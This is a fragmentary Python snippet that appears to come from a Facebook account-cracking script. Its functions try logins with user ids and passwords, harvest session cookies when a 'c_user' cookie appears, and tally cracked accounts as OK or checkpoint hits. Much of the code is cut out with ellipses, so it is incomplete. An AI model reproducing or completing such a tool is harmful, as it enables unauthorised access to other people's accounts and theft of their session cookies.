...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r {GREEN}[BRAND] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
...
def free(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[BRAND-CP-]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|BRAND-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
